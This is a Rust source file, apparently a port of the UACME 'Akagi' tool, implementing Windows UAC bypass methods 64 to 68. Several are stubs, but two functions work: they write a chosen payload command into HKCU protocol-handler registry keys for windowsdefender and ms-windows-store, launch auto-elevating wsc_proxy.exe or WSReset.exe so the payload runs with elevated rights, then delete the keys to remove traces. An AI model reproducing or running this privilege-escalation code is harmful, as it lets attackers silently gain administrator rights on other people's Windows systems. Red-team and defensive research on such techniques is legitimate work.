// Shell-based UAC bypass methods
// Port of Source/Akagi/methods/shellsup.c

use crate::context::*;
use crate::methods::*;
use shared::*;
use windows::core::PCWSTR;

/// Method 64: IE Add-On Install
/// Bypass UAC using IE add-on installer
pub fn method_ie_addon_install(ctx: &mut UacmeContext, _params: &MethodParams) -> MethodResult {
    log::info!("[Method 64] IE Add-On Install");
    
    log::warn!("IE Add-On Install method not fully implemented");
    constants::STATUS_NOT_IMPLEMENTED
}

/// Method 65: WSC Action Protocol
/// Bypass UAC using wsc_proxy.exe with protocol handler
pub fn method_wsc_action_protocol(ctx: &mut UacmeContext, _params: &MethodParams) -> MethodResult {
    log::info!("[Method 65] WSC Action Protocol");
    
    let payload = ctx.get_payload();
    let payload_str = from_wide_string(&payload);
    
    wsc_action_protocol_hijack(&payload_str)
}

/// Method 66: FwCplLua2
/// Bypass UAC using Firewall CPL with COM
pub fn method_fwcpllua2(ctx: &mut UacmeContext, _params: &MethodParams) -> MethodResult {
    log::info!("[Method 66] FwCplLua2");
    
    log::warn!("FwCplLua2 method not fully implemented");
    constants::STATUS_NOT_IMPLEMENTED
}

/// Method 67: MS Settings Protocol
/// Bypass UAC using ms-settings protocol handler
pub fn method_ms_settings_protocol(ctx: &mut UacmeContext, _params: &MethodParams) -> MethodResult {
    log::info!("[Method 67] MS Settings Protocol");
    
    let payload = ctx.get_payload();
    let payload_str = from_wide_string(&payload);
    
    // Similar to method 33
    super::api0cradle::method_ms_settings(ctx, _params)
}

/// Method 68: MS Store Protocol
/// Bypass UAC using ms-windows-store protocol
pub fn method_ms_store_protocol(ctx: &mut UacmeContext, _params: &MethodParams) -> MethodResult {
    log::info!("[Method 68] MS Store Protocol");
    
    let payload = ctx.get_payload();
    let payload_str = from_wide_string(&payload);
    
    ms_store_protocol_hijack(&payload_str)
}

/// WSC Action Protocol hijack
fn wsc_action_protocol_hijack(payload: &str) -> MethodResult {
    use windows::Win32::System::Registry::*;
    use windows::Win32::Foundation::*;
    
    // HKCU\Software\Classes\windowsdefender\shell\open\command
    let reg_path = to_wide_string("Software\\Classes\\windowsdefender\\shell\\open\\command");
    
    unsafe {
        let key_result = winapi_ext::RegistryKey::create(
            HKEY_CURRENT_USER,
            &reg_path,
            KEY_WRITE.0,
        );
        
        let key = match key_result {
            Ok(k) => k,
            Err(e) => {
                log::error!("Failed to create registry key: {}", e);
                return constants::STATUS_ACCESS_DENIED;
            }
        };
        
        let payload_wide = to_wide_string(payload);
        let empty_wide = to_wide_string("");
        
        if key.set_string_value(&empty_wide, &payload_wide).is_err() {
            return constants::STATUS_ACCESS_DENIED;
        }
        
        // Launch wsc_proxy.exe with protocol
        let sys_dir = query_system_directory(true);
        let sys_dir_str = from_wide_string(&sys_dir);
        let wsc_proxy = format!("{}wsc_proxy.exe windowsdefender:", sys_dir_str);
        
        let result = match winapi_ext::create_process_simple(&to_wide_string(&wsc_proxy), None, 1) {
            Ok(pi) => {
                let _ = CloseHandle(pi.hProcess);
                let _ = CloseHandle(pi.hThread);
                std::thread::sleep(std::time::Duration::from_secs(3));
                constants::STATUS_SUCCESS
            }
            Err(_) => constants::STATUS_ACCESS_DENIED,
        };
        
        // Cleanup
        let defender_path = to_wide_string("Software\\Classes\\windowsdefender");
        let _ = RegDeleteTreeW(HKEY_CURRENT_USER, PCWSTR(defender_path.as_ptr()));
        
        result
    }
}

/// MS Store Protocol hijack
fn ms_store_protocol_hijack(payload: &str) -> MethodResult {
    use windows::Win32::System::Registry::*;
    use windows::Win32::Foundation::*;
    
    // HKCU\Software\Classes\ms-windows-store\shell\open\command
    let reg_path = to_wide_string("Software\\Classes\\ms-windows-store\\shell\\open\\command");
    
    unsafe {
        let key_result = winapi_ext::RegistryKey::create(
            HKEY_CURRENT_USER,
            &reg_path,
            KEY_WRITE.0,
        );
        
        let key = match key_result {
            Ok(k) => k,
            Err(e) => {
                log::error!("Failed to create registry key: {}", e);
                return constants::STATUS_ACCESS_DENIED;
            }
        };
        
        let payload_wide = to_wide_string(payload);
        let empty_wide = to_wide_string("");
        
        if key.set_string_value(&empty_wide, &payload_wide).is_err() {
            return constants::STATUS_ACCESS_DENIED;
        }
        
        let delegate_wide = to_wide_string("DelegateExecute");
        let _ = key.set_string_value(&delegate_wide, &empty_wide);
        
        // Launch WSReset.exe
        let sys_dir = query_system_directory(true);
        let sys_dir_str = from_wide_string(&sys_dir);
        let wsreset = format!("{}WSReset.exe", sys_dir_str);
        
        let result = match winapi_ext::create_process_simple(&to_wide_string(&wsreset), None, 1) {
            Ok(pi) => {
                let _ = CloseHandle(pi.hProcess);
                let _ = CloseHandle(pi.hThread);
                std::thread::sleep(std::time::Duration::from_secs(3));
                constants::STATUS_SUCCESS
            }
            Err(_) => constants::STATUS_ACCESS_DENIED,
        };
        
        // Cleanup
        let store_path = to_wide_string("Software\\Classes\\ms-windows-store");
        let _ = RegDeleteTreeW(HKEY_CURRENT_USER, PCWSTR(store_path.as_ptr()));
        
        result
    }
}

